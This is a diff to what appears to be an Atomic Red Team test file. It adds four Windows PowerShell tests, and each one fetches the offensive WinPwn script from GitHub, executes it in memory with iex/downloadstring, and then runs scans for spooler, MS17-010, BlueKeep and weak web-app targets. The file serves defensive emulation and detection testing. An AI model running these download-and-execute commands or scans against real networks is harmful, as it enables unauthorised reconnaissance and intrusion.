@@ -120,3 +120,43 @@ atomic_tests:
     command: |
       python #{filename} -i #{host_ip}
     name: powershell
+- name: WinPwn - spoolvulnscan
+  description: Start MS-RPRN RPC Service Scan using spoolvulnscan function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      spoolvulnscan -noninteractive -consoleoutput
+    name: powershell
+- name: WinPwn - MS17-10
+  description: Search for MS17-10 vulnerable Windows Servers in the domain using powerSQL function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      MS17-10 -noninteractive -consoleoutput
+    name: powershell
+- name: WinPwn - bluekeep
+  description: Search for bluekeep vulnerable Windows Systems in the domain using bluekeep function of WinPwn. May need -TimeoutSeconds increased (600 in testing).
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      bluekeep -noninteractive -consoleoutput
+    name: powershell
+- name: WinPwn - fruit
+  description: Search for potential vulnerable web apps (low hanging fruits) using fruit function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      fruit -noninteractive -consoleoutput
+    name: powershell
